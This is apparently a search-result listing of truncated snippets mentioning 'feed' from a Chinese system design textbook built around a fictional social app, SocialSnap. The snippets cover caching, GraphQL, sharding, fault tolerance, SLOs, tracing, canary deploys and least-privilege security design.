  c07_b16.md: ...造成负载突增。与此同时，这 500 万个缓存条目全部变成冷未命中——如果这位名人的 500 万活跃粉丝在未来几分钟查看 Feed，你就会在极短时间内得到 500 万个数据库查询。Phil 的完美失效策略在最大规模上制造了惊群。  TTL 避免的故障...
  c09_b08.md: ...当许多不同客户端（Web、移动、第三方开发者）需要以不同形态获取相同底层数据时。例如 Facebook 的 news feed 在 Web、Android、iOS 上渲染不同——但底层数据（帖子、用户、互动）相同。GraphQL 让每个客户端从单...
  c09_b14.md: ...*Q1.** SocialSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{id}`、`GET /feed`、`GET /users/{i...
  c09_b14.md: ...L。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{id}`、`GET /feed`、`GET /users/{id}/following_count`、`GET /notifications/coun...
  c09_b14.md: ...要 4 个独立 REST 调用。每次调用在移动网络上都是一次独立往返（每个约 50-100ms）。串行请求时 home feed 可渲染前的总时间：200-400ms；即使并行也需要约 100-150ms。GraphQL 会把这 4 个调用合并成一...
  c09_b14.md: ...ollowingCount         unreadNotificationCount       }       feed(limit: 20) {         postId         author { username photo...
  c09_b14.md: ...段和额外请求开销而节省。  **反对 GraphQL 的线索（或需要小心处理）：**  缓存：REST 的 `GET /feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 query body 的 POST...
  c09_b14.md: ...GraphQL 对移动 API 是正确选择，但有两个条件：  1. 实现查询深度和复杂度限制，防止滥用查询。 2. 为 feed resolver 实现应用层缓存（用短 TTL 缓存渲染后的 feed，如第 7 章讨论），弥补失去 HTTP 层缓存...
  c09_b14.md: ...查询深度和复杂度限制，防止滥用查询。 2. 为 feed resolver 实现应用层缓存（用短 TTL 缓存渲染后的 feed，如第 7 章讨论），弥补失去 HTTP 层缓存的影响。  4→1 的请求减少在移动网络上是显著胜利。服务器端复杂度是一...
  c09_b15.md: ...TTP 端点。  如果客户端没有 WebSocket，每 30 秒发一次 HTTP POST 也完全可接受。  **为 feed 渲染查询在线状态：**  渲染 feed 头像时，客户端可以批量查询所有可见用户的在线状态：`MGET presenc...
  c09_b15.md: ...ocket，每 30 秒发一次 HTTP POST 也完全可接受。  **为 feed 渲染查询在线状态：**  渲染 feed 头像时，客户端可以批量查询所有可见用户的在线状态：`MGET presence:42 presence:107 pre...
  c09_b17.md: ...作。  但如第 7 章所述：CDN 缓存只适用于所有用户都相同的内容（公开、非个性化）。Alice 登录后的 home feed——个性化、动态——不能在页面级缓存到 CDN。  **Q2.**（联系第 8 章消息队列）一个带粘性会话的负载均衡器基...
  c10_b08.md: ...地数据需要更多时，才会向其他节点请求——但这是例外，不是常态。  对 SocialSnap，这一原则解释了为什么复杂的 feed 排序计算应在数据库（或靠近数据的计算层）中完成，而不是把所有候选帖子取到应用服务器再排序。数据在数据库中，计算也应放在...
  c12_b02.md: ...多数生产系统中，读远多于写。SocialSnap 的工作负载很典型：每有一个人创建帖子（一次写），就有大约五十个人浏览 feed、资料或帖子（读）。比例可能是 10:1、50:1，甚至 100:1，取决于应用。Twitter 著名的读写比极端到大部...
  c12_b05.md: ...——叫她 @nova——有 2000 万（20 million）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  sha...
  c12_b12.md: ...是“获取某用户的所有帖子”。如果帖子按 post_id（主键）分片，单个用户的帖子就分散在所有 shard。每次取用户 feed 都要扇出到所有 shard。如果改为按 user_id 分片，同一用户的所有帖子都在一个 shard——最常见查询是单...
  c13_b11.md: ...时。私信有独特的数据（消息线程与帖子不同）、独特的扩展特征（不同的读/写模式），并有故障隔离收益（私信故障不会影响公共 feed）。但如果团队很小，私信最初可能与帖子共享服务。  **帖子创建/浏览**——应用核心。最好作为独立服务，很可能是最大的...
  c13_b11.md: ...小，私信最初可能与帖子共享服务。  **帖子创建/浏览**——应用核心。最好作为独立服务，很可能是最大的。拥有帖子数据、feed 生成、点赞、评论。这个服务本身内部可能很复杂，最终可能进一步分解（专门的 Feed Service、Recommend...
  c13_b13.md: ...：** gRPC 支持单条 HTTP/2 连接上的双向流。HTTP/1.1 上的 REST 每次请求需要新连接。对实时 feed 或实时更新，REST 的连接开销显著。...
  c15_b16.md: ...知道 API 调用序列。这类似于任何按顺序调用多个 API 的客户端。Web 浏览器加载页面时会调用 CDN、用户服务、feed 服务——它在“知道”它们 API 的意义上与它们耦合。我们不认为这 problematic。  对编排器有意义的问题是...
  c16_b06.md: ...个共享线程池，而是为不同类别维护独立线程池：  * **关键路径线程池（200 线程）：** 用于应用核心请求——浏览 feed、发帖、登录。这些必须始终有线程可用。 * **社交功能线程池（50 线程）：** 用于非关键功能——热门话题、推荐用户...
  c16_b06.md: ...如果外部 API 线程池填满（支付处理器慢），外部 API 请求开始失败。但关键路径线程池不受影响——用户仍可以浏览 feed、发帖、登录。失败被限制在外部 API 池中。  对 SocialSnap 的 Redis 失败：有了舱壁隔离，依赖 R...
  c16_b07.md: ...** 数据库不可用时返回数据的最近缓存版本。数据可能陈旧，但比错误好。SocialSnap 在数据库变慢期间可提供缓存 feed 页面（第 7 章 Redis 缓存支持这点）。  **返回默认值：** 个性化数据不可用时（如推荐服务宕机）返回非个性...
  c16_b13.md: ...计算热门话题的服务失败，应用应完全隐藏该侧边栏，其余页面正常服务。用户看到略减的 UI，但仍能使用应用。  登录和浏览 feed 功能是第 1 层——应用核心。如果系统负载严重或部分失败，这些功能应受保护：它们有专用线程池容量（舱壁模式）、依赖项有...
  c16_b13.md: ...（舱壁模式）、依赖项有紧致熔断器、回退策略（缓存 feed、数据库会话回退）已就绪。热门侧边栏失败可接受；不能登录或看 feed 则是完全 outage。...
  c16_b14.md: ...Q1.** SocialSnap 的应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。每个服务可用性（availab...
  c16_b14.md: ...应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。每个服务可用性（availability）99%。没有熔断器时页面...
  c16_b14.md: ...级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和...
  c16_b14.md: ...Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 = 0.99 × 0.99 = 0.9801。只要两个核心服务在线，页面就加载（无论是...
  c16_b14.md: ...面**（三个服务都在）：0.99 × 0.99 × 0.99 = 97.0% * **降级但可用页面**（User + Feed 在线，Trending 失败）：0.99 × 0.99 × 0.01 = 0.98% * **页面完全失败**（Use...
  c16_b14.md: ...失败）：0.99 × 0.99 × 0.01 = 0.98% * **页面完全失败**（User Service 或 Feed Service 失败）：1 − 0.9801 = 1.99%  这一改进（约 3% 页面完全失败 → 1.99% 完全...
  c17_b01.md: ...测失败。熔断器在积累足够错误后才会跳闸——但如果应用没有埋点来跟踪错误，它就无法计数。优雅降级意味着在缓存慢时提供陈旧 feed 而非错误页——但前提是系统能区分“缓存慢”和“缓存完全不可用”。第 16 章的每个模式都依赖一个我们尚未构建的前提：看...
  c17_b02.md: ...请求成功率：返回非 5xx 响应的 HTTP 请求比例 * 99 百分位延迟：99% 请求完成得比它快的响应时间 * feed 新鲜度：展示给用户最新帖子的年龄  SLI 必须是你能量化的东西。“用户幸福感”不是 SLI。“低于 200ms 完成...
  c17_b03.md: ...TP 请求应返回非 5xx 响应”——可用性 SLO * “99 百分位延迟应低于 200ms”——延迟 SLO * “feed 中不应有超过 60 秒陈旧的帖子”——新鲜度 SLO  SLO 不是完美目标。为每个端点设置“99.999% 成功率”...
  c17_b06.md: ...第 1 章）中，回答这个问题很容易：一个进程，一个日志文件。但到了第 13 章的微服务架构，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Aut...
  c17_b06.md: ...—接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. Us...
  c17_b06.md: ...理请求、每一步花多久—— stitched together 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms]  AP...
  c17_b06.md: ...ce ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15ms)...
  c17_b06.md: ...Auth Service: validate_jwt (15ms)         [22ms - 240ms] Feed Service: get_feed (218ms)           [25ms - 50ms]  Redis: g...
  c17_b06.md: ...大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据库查询是瓶颈。...
  c17_b06.md: ...第 1 章）中，回答这个问题很容易：一个进程，一个日志文件。但到了第 13 章的微服务架构，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Aut...
  c17_b06.md: ...—接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. Us...
  c17_b06.md: ...理请求、每一步花多久—— stitched together 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms]  AP...
  c17_b06.md: ...ce ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15ms)...
  c17_b06.md: ...Auth Service: validate_jwt (15ms)         [22ms - 240ms] Feed Service: get_feed (218ms)           [25ms - 50ms]  Redis: g...
  c17_b06.md: ...大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，工程师立刻知道该看哪里：User Service 的数据库查询是瓶颈。...
  c17_b09.md: ...：检查 Redis 集群状态，检查熔断器是否已打开。  第 16 章的熔断器已经开始触发。应用正通过数据库回退提供降级 feed 内容，而不是从 Redis 缓存提供。用户看到略陈旧的 feed，但应用没有返回 503 错误。  工程师查询日志：“...
  c17_b09.md: ...章的熔断器已经开始触发。应用正通过数据库回退提供降级 feed 内容，而不是从 Redis 缓存提供。用户看到略陈旧的 feed，但应用没有返回 503 错误。  工程师查询日志：“显示过去 5 分钟 `upstream == 'redis'` 的...
  c17_b09.md: ...副本的故障转移。  到 2:51——降级开始四分钟——Redis shard 2 恢复健康。错误率回到正常。熔断器闭合。feed 恢复完整质量。用户总影响：数据在 shard 2 上的用户经历 4 分钟略陈旧的 feed。没有 503 错误。没有完...
  c17_b09.md: ...错误率回到正常。熔断器闭合。feed 恢复完整质量。用户总影响：数据在 shard 2 上的用户经历 4 分钟略陈旧的 feed。没有 503 错误。没有完整 outage。  未观测到的周二 outage（20 多分钟完全失败）与观测到的版本（4...
  c17_b11.md: ...#### 应用问题  **Q1.** SocialSnap 每秒服务 50,000 请求。你正在为 `/feed` 端点设计 SLO。团队在 99% 可用性（允许 500 次失败/秒）和 99.9% 可用性（允许 50 次失败/秒）...
  c17_b11.md: ...间争论。做此决定时应考虑哪些因素，你会写什么 SLO？  提示  考虑用户容忍度、业务影响和维持 SLO 的成本。谁受 feed 端点失败影响？这是免费服务还是付费？竞争对手提供什么？  **答案：** 关键因素：(1) 用户容忍度——社交 fee...
  c17_b11.md: ...eed 端点失败影响？这是免费服务还是付费？竞争对手提供什么？  **答案：** 关键因素：(1) 用户容忍度——社交 feed 失败令人烦恼但不灾难；用户会重试。这支持 99.9% 而非 99.99%。(2) 业务影响——对免费社交平台，长时间...
  c17_b11.md: ...降级可接受。(3) 运营成本——维持 99.99% 需要更激进的告警和响应，降低开发速度。(4) 竞争对手基准——社交 feed 的行业标准通常是 99.9%。  一套合理的 SLO：  * **可用性 SLO：** 99.9% 的 `/feed`...
  c17_b11.md: ...feed 的行业标准通常是 99.9%。  一套合理的 SLO：  * **可用性 SLO：** 99.9% 的 `/feed` 请求返回非 5xx 响应，以滚动 30 天窗口测量 * **延迟 SLO：** p95 响应时间低于 300ms，p...
  c17_b11.md: ...* p95 响应时间低于 300ms，p99 低于 1000ms * **新鲜度 SLO：**（新且不常见）99% 的 feed 响应至少展示一条最近 5 分钟的帖子  可用性 SLO 在 50,000 RPS 时的错误预算：0.1% = 每秒 5...
  c17_b13.md: ...。SLO 把无论是否写下来都存在的用户期望转化为工程目标，可以测量、跟踪并用于投资决策。用户加载 SocialSnap feed 时期望它在 1 秒内加载——他们没有签 SLA，但如果应用一直慢他们就会离开。SLO 把模糊期望转化为可测量目标。...
  c18_b01.md: ...万（3 million）用户。10 分钟 outage 影响 50 万（500,000）并发用户。一个让 5% 用户 feed 损坏的糟糕部署会产生数千张工单、可衡量的流失和受损声誉。然而 SocialSnap 需要持续发布功能——这是它的竞争力...
  c18_b02.md: ...试能捕获“这条 SQL 查询在 SQLite 单元测试中通过，但在 PostgreSQL 上有语法错误”。契约测试捕获“feed 服务改成返回 `authorName`，但渲染服务仍期望 `author_name`”。负载测试捕获“Redis 连接...
  c18_b02.md: ...交互   #### 集成测试  服务集成测试让单个服务针对真实（或真实感）的依赖实例运行。对 SocialSnap 的 Feed Service，集成测试可能：  1. 启动一个 PostgreSQL 实例（测试环境用 Docker） 2. 填充测...
  c18_b02.md: ...2. 填充测试数据（10 个用户、50 条帖子） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——...
  c18_b02.md: ...0 条帖子） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——可能 5–30 秒——但它捕获单元测...
  c18_b02.md: ...试能捕获“这条 SQL 查询在 SQLite 单元测试中通过，但在 PostgreSQL 上有语法错误”。契约测试捕获“feed 服务改成返回 `authorName`，但渲染服务仍期望 `author_name`”。负载测试捕获“Redis 连接...
  c18_b02.md: ...交互   #### 集成测试  服务集成测试让单个服务针对真实（或真实感）的依赖实例运行。对 SocialSnap 的 Feed Service，集成测试可能：  1. 启动一个 PostgreSQL 实例（测试环境用 Docker） 2. 填充测...
  c18_b02.md: ...2. 填充测试数据（10 个用户、50 条帖子） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——...
  c18_b02.md: ...0 条帖子） 3. 启动一个 Redis 实例 4. 启动配置为指向这些测试实例的 Feed Service 5. 向 Feed Service 发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——可能 5–30 秒——但它捕获单元测...
  c18_b03.md: ...20，负载测试应匹配。 3. **测试特定场景**——“模拟一条 viral post 导致 1000 个同时请求同一 feed 页面”测试第 7 章的惊群问题。 4. **跑到稳态（steady state，状态）**——不只跑 60 秒，而要足...
  c18_b04.md: ...例子：  * **kill 一个数据库副本：** 流量是否自动路由到主库？耗时多久？过渡期间用户体验如何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置...
  c18_b04.md: ...用户体验如何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置能否优雅处理？是否触发熔断器？是返回降级响应还是错误？ * **把消息队列填到 100,00...
  c18_b07.md: ...#### SocialSnap 的第一次金丝雀部署  SocialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模型预测用户最可能参与的帖子放在前面...
  c18_b07.md: ...ialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模型预测用户最可能参与的帖子放在前面。  这不是 bug 修复——而是影响不确定的产品变更。团队无法预测新算法会提高...
  c18_b07.md: ...队无法预测新算法会提高参与率、降低参与率，还是产生意外边界情况。他们以金丝雀方式部署。  **设置：** 团队部署新的 Feed Service 版本（v2.4.0）与当前版本（v2.3.1）并存。负载均衡器配置为把 5% 用户路由到 v2.4.0...
  c18_b07.md: ...。负载均衡器配置为把 5% 用户路由到 v2.4.0。路由是粘性的——同一用户总是去同一版本，确保用户不会在请求间看到 feed 重新排序。  **埋点：** 部署前，团队为这个实验专门添加 SLI 指标：  * `feed_engagement_...
  c18_b07.md: ...**埋点：** 部署前，团队为这个实验专门添加 SLI 指标：  * `feed_engagement_rate`：feed 曝光导致点赞、评论或点击的比例 * `feed_load_time_p99`：99 百分位 feed 加载时间 * `...
  c18_b07.md: ...nt_rate`：feed 曝光导致点赞、评论或点击的比例 * `feed_load_time_p99`：99 百分位 feed 加载时间 * `feed_error_rate`：返回错误的 feed 请求比例  他们设置了一个仪表盘，并排显示金丝...
  c18_b07.md: ...d_load_time_p99`：99 百分位 feed 加载时间 * `feed_error_rate`：返回错误的 feed 请求比例  他们设置了一个仪表盘，并排显示金丝雀（v2.4.0）和对照组（v2.3.1）在这三个指标上的数据。  **...
  c18_b07.md: ...#### SocialSnap 的第一次金丝雀部署  SocialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模型预测用户最可能参与的帖子放在前面...
  c18_b07.md: ...ialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模型预测用户最可能参与的帖子放在前面。  这不是 bug 修复——而是影响不确定的产品变更。团队无法预测新算法会提高...
  c18_b07.md: ...队无法预测新算法会提高参与率、降低参与率，还是产生意外边界情况。他们以金丝雀方式部署。  **设置：** 团队部署新的 Feed Service 版本（v2.4.0）与当前版本（v2.3.1）并存。负载均衡器配置为把 5% 用户路由到 v2.4.0...
  c18_b07.md: ...。负载均衡器配置为把 5% 用户路由到 v2.4.0。路由是粘性的——同一用户总是去同一版本，确保用户不会在请求间看到 feed 重新排序。  **埋点：** 部署前，团队为这个实验专门添加 SLI 指标：  * `feed_engagement_...
  c18_b07.md: ...**埋点：** 部署前，团队为这个实验专门添加 SLI 指标：  * `feed_engagement_rate`：feed 曝光导致点赞、评论或点击的比例 * `feed_load_time_p99`：99 百分位 feed 加载时间 * `...
  c18_b07.md: ...nt_rate`：feed 曝光导致点赞、评论或点击的比例 * `feed_load_time_p99`：99 百分位 feed 加载时间 * `feed_error_rate`：返回错误的 feed 请求比例  他们设置了一个仪表盘，并排显示金丝...
  c18_b07.md: ...d_load_time_p99`：99 百分位 feed 加载时间 * `feed_error_rate`：返回错误的 feed 请求比例  他们设置了一个仪表盘，并排显示金丝雀（v2.4.0）和对照组（v2.3.1）在这三个指标上的数据。  **...
  c18_b09.md: ...沌工程）。选择取决于变更的风险画像和做错的成本。  对非关键端点的一行 bug 修复，可能不需要金丝雀。对改变每个用户 feed 体验的新排序算法，绝对需要。   ### 18.6 练习...
  c18_b12.md: ...添加 `reactions` 表和 posts 上的新 `reaction_count` 列）、新 API 端点，以及 feed 渲染服务的变更。设计部署计划，包括迁移策略、功能开关使用和回滚计划。  提示  思考操作顺序：数据库必须先满足什么，应...
  c18_b12.md: ...端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更，在功能开关开启时响应中包括 `reaction_count`。 * 功能开关“reactions...
  c18_b12.md: ...ctions` 表迁移出现任何错误。 * 动作：对所有用户禁用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停止显示 reaction 计数。 * 数据库：`reactions` 表和 `reaction_count` 列保留...
  c18_b12.md: ...* SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth...
  c18_b12.md: ...th Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失败。诊断该模式并提出修复。  提示  回想第 7...
  c18_b12.md: ...添加 `reactions` 表和 posts 上的新 `reaction_count` 列）、新 API 端点，以及 feed 渲染服务的变更。设计部署计划，包括迁移策略、功能开关使用和回滚计划。  提示  思考操作顺序：数据库必须先满足什么，应...
  c18_b12.md: ...端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更，在功能开关开启时响应中包括 `reaction_count`。 * 功能开关“reactions...
  c18_b12.md: ...ctions` 表迁移出现任何错误。 * 动作：对所有用户禁用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停止显示 reaction 计数。 * 数据库：`reactions` 表和 `reaction_count` 列保留...
  c18_b12.md: ...* SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth...
  c18_b12.md: ...th Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失败。诊断该模式并提出修复。  提示  回想第 7...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它...
  c18_b13.md: ...继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Servi...
  c18_b13.md: ...它表现得好像 Auth Service 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这...
  c18_b13.md: ...但意味着用户在 Auth outage 期间看到错误而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth...
  c18_b13.md: ...uth outage 期间经历错误而不是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Feed Service 重试失败的 Auth 调用，必须使用指数退避和抖动，让数千并发请求的重试不会同时触发。没有抖动，重试会...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个...
  c18_b13.md: ...**答案：** 这是服务恢复场景中的惊群问题。Auth Service 不可用时，进入的 feed 请求在 Feed Service 中堆积——等待认证成功后再继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它...
  c18_b13.md: ...继续。Auth Service 恢复后，所有 5000 个等待请求同时调用它，在它完全预热前压垮它。  **根因：** Feed Service 没有任何限制对 Auth Service 并发调用的机制。恢复期间，它表现得好像 Auth Servi...
  c18_b13.md: ...它表现得好像 Auth Service 容量无限。  **修复——多层：**  1. **熔断器（第 16 章）：** Feed Service 应在 Auth Service 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这...
  c18_b13.md: ...但意味着用户在 Auth outage 期间看到错误而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth...
  c18_b13.md: ...uth outage 期间经历错误而不是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Feed Service 重试失败的 Auth 调用，必须使用指数退避和抖动，让数千并发请求的重试不会同时触发。没有抖动，重试会...
  c18_b15.md: ...expand-contract 模式，以在部署窗口期间保持向后兼容。  SocialSnap 的第一次金丝雀部署——新 feed 排序算法——表明部署安全不仅是防止失败。它是在承诺变更前从生产流量中收集经验证据。金丝雀是受控实验；指标是结果；扩展或...
  c19_b02.md: ...户、服务、进程或系统——只应访问其完成职能所需的资源，不多不少。  plain 语言：给每个人最小必要访问，别多给。  Feed Service 用于读取帖子的数据库账户应只拥有 `posts` 表的 `SELECT` 权限，不能有 `INSERT...
  c19_b02.md: ...`SELECT` 权限，不能有 `INSERT`、`UPDATE`、`DELETE`、`DROP TABLE`。如果 Feed Service 被入侵，攻击者继承的只是被入侵账户的权限：只读访问 posts。他们无法删除数据、修改账户或访问支付记...
  c19_b03.md: ...名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF2...`  Feed Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信—...
  c19_b03.md: ...果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `user_id` 和 `scope` 而无需每次都调用 auth 服...
  c19_b09.md: ...IAM 角色）并在启动时获取密钥。 3. 密钥可在密钥管理器中轮换，服务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在...
  c19_b09.md: ...3. 密钥可在密钥管理器中轮换，服务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在密钥上的应用。  **密钥管理最重要...
  c19_b09.md: ...IAM 角色）并在启动时获取密钥。 3. 密钥可在密钥管理器中轮换，服务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在...
  c19_b09.md: ...3. 密钥可在密钥管理器中轮换，服务自动更新。 4. 对特定密钥的访问由策略控制：Feed Service 只能访问 feed 数据库的凭证——不能访问 auth 数据库凭证或支付服务凭证。这就是最小权限原则在密钥上的应用。  **密钥管理最重要...
  c19_b12.md: ...小权限原则。  **答案：** 最小权限原则：每个实体只访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Servic...
  c19_b12.md: ...访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库账户应拥有：`posts` 表的 `SE...
  c19_b12.md: ...Snap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库账户应拥有：`posts` 表的 `SELECT`、`users` 表（仅限公开字段）的...
  c19_b12.md: ...有：`posts` 表的 `SELECT`、`users` 表（仅限公开字段）的 `SELECT`，仅此而已。  如果 Feed Service 被攻击者入侵——可能通过远程代码执行漏洞——攻击者只能使用被入侵账户读取帖子和用户资料。他们无法修改数...
  c19_b12.md: ...小权限原则。  **答案：** 最小权限原则：每个实体只访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Servic...
  c19_b12.md: ...访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库账户应拥有：`posts` 表的 `SE...
  c19_b12.md: ...Snap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed Service 使用的数据库账户应拥有：`posts` 表的 `SELECT`、`users` 表（仅限公开字段）的...
  c19_b12.md: ...有：`posts` 表的 `SELECT`、`users` 表（仅限公开字段）的 `SELECT`，仅此而已。  如果 Feed Service 被攻击者入侵——可能通过远程代码执行漏洞——攻击者只能使用被入侵账户读取帖子和用户资料。他们无法修改数...
  c19_b14.md: ...opes, refresh_token_hash, expires_at, revoked_at  **最小权限：** Feed Service 验证 JWT 并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JW...
  c19_b15.md: ...希是单向的——适合等值查找，不适合显示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth S...
  c21_b01.md: ...消息历史保留，用户可搜索最长 1 年 * 群聊最多 100 名成员 * DM 系统不得降低 SocialSnap 核心 feed 体验（隔离要求）  **约束（证据）：**  * 500 万（5 million）日活用户；峰值并发用户约 50 万（...
  c21_b09.md: ...出可接受。对大群（超过阈值，比如 1000 名），需要不同策略。  我们将在第 22 章深入讨论扇出，在那里它成为新闻 Feed 设计的中心话题。目前，注意 SocialSnap DM 功能把群限制在 100 名成员，使用投递时直接扇出——100...
  c21_b10.md: ...** 加入 Redis 缓存用于资料查找。首次尝到缓存降低延迟的甜头——也出现首个陈旧 bug：用户更新资料后一小时内 feed 仍显示旧版本。加入基于 TTL 的失效作为修复。  **v3（第 8 章）：** 加入通知队列。欢迎邮件从 HTTP...
  c21_b10.md: ...is 修复。无状态（stateless）要求被内化。  **v5（第 12 章）：** 数据库成为瓶颈。加入读副本处理 feed 日益增长的读负载。最终按 `user_id` 分片。首个跨分片查询问题：“查找 Alice 关注的所有用户的帖子”需要...
  c21_b10.md: ...16 章）：** 首次重大故障——Redis 降级级联到整个应用失败。加入熔断器。实现优雅降级：Redis 不可用时 feed 回退到数据库，提供略陈旧内容而非报错。意识到可靠性需要面向失败设计，而非避免失败。  **v7（第 21 章）：**...
  c21_b10.md: ...状态的（stateful）、基于 WebSocket 的通信——与现有无状态的（stateless）基于 HTTP 的 feed 和帖子系统并行运行。DM 系统与核心 feed 系统隔离（独立连接服务器、独立数据库集群），以满足 DMs 不得降低核...
